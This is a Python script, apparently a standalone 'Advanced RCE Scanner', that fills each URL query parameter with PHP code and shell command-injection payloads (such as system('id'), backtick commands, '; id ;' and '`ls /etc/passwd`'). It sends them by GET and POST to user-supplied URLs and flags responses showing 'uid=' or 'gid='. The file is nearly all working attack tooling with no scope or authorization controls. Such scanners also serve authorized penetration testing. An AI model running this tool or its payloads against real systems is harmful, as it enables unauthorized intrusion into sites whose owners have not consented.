import requests
import os
from urllib.parse import urlparse, parse_qs, urlencode
from tqdm import tqdm

def display_name():
    banner = """
    \033[32m
    █████╗ ███████╗ █████╗ ██████╗ ██╗███╗   ██╗███████╗
    ██╔══██╗██╔════╝██╔══██╗██╔══██╗██║████╗  ██║██╔════╝
    ███████║███████╗███████║██████╔╝██║██╔██╗ ██║███████╗
    ██╔══██║╚════██║██╔══██║██╔══██╗██║██║╚██╗██║╚════██║
    ██║  ██║███████║██║  ██║██║  ██║██║██║ ╚████║███████║
    ╚═╝  ╚═╝╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝ ╚═╝  ╚═══╝╚══════╝

    Advanced RCE Scanner (Developed by: asadinto)
    \033[0m
    """
    print(banner)

def get_advanced_rce_payloads():
    return [
        "<?php phpinfo(); ?>",
        "<?php system('id'); ?>",
        "<?php echo shell_exec('id'); ?>",
        "`id`",
        "`uname -a`",
        "`ls /etc/passwd`",
        "&& id &&",
        "| id |",
        "|| id ||",
        "; id ;"
    ]

def detect_parameters_from_url(url):
    """Extract query parameters from the URL."""
    parsed_url = urlparse(url)
    query_params = parse_qs(parsed_url.query)
    return {k: v[0] for k, v in query_params.items()}

def test_rce(url, payloads, report_file, custom_headers=None):
    with open(report_file, 'a') as report:
        report.write(f"\nTesting URL: {url}\n")
        report.write("="*50 + "\n")
        
        # Extract query parameters
        params = detect_parameters_from_url(url)
        
        for payload in payloads:
            try:
                # Test via GET method
                test_params = params.copy()
                for key in test_params:
                    test_params[key] = payload
                
                get_response = requests.get(url, params=test_params, headers=custom_headers, timeout=10)
                report.write(f"\nGET Request Payload: {payload}\n")
                if "uid=" in get_response.text or "gid=" in get_response.text:
                    report.write(f"✅ Possible RCE detected via GET. Response:\n{get_response.text[:500]}\n")
                    print(f"✅ Possible RCE detected on {url} with GET payload: {payload}")
                else:
                    report.write("No RCE detected via GET.\n")
                
                # Test via POST method
                post_response = requests.post(url, data=test_params, headers=custom_headers, timeout=10)
                report.write(f"POST Request Payload: {payload}\n")
                if "uid=" in post_response.text or "gid=" in post_response.text:
                    report.write(f"✅ Possible RCE detected via POST. Response:\n{post_response.text[:500]}\n")
                    print(f"✅ Possible RCE detected on {url} with POST payload: {payload}")
                else:
                    report.write("No RCE detected via POST.\n")
            
            except Exception as e:
                report.write(f"⚠️ Error testing payload: {payload}. Exception: {str(e)}\n\n")
                print(f"⚠️ Error testing {url} with payload: {payload}: {e}")

def save_report_directory(domain_name):
    report_dir = f"reports/{domain_name}"
    os.makedirs(report_dir, exist_ok=True)
    return f"{report_dir}/rce_report.txt"

def load_urls(file_path=None):
    urls = []
    if file_path:
        try:
            with open(file_path, 'r') as file:
                urls = [line.strip() for line in file if line.strip()]
        except FileNotFoundError:
            print("⚠️ URL file not found. Please check the file path.")
    else:
        url = input("Enter a single URL: ").strip()
        urls.append(url)
    return urls

def main():
    display_name()
    choice = input("Enter [1] to scan a file of URLs or [2] to test a single URL: ")
    file_path = None

    if choice == "1":
        file_path = input("Enter the path to the URL file: ").strip()
    elif choice == "2":
        print("You will be prompted to enter a single URL.")

    urls = load_urls(file_path)

    if not urls:
        print("⚠️ No URLs provided. Exiting...")
        return

    # Load advanced RCE payloads
    payloads = get_advanced_rce_payloads()
    
    # Optional custom headers
    custom_headers = {
        "User-Agent": "AdvancedRCE/1.0",
        "Accept": "*/*"
    }

    for url in tqdm(urls, desc="Testing URLs"):
        domain_name = urlparse(url).netloc.replace('.', '_')
        report_file = save_report_directory(domain_name)
        test_rce(url, payloads, report_file, custom_headers)

    print("✅ Testing completed. Check the reports folder for detailed results.")

if __name__ == "__main__":
    main()
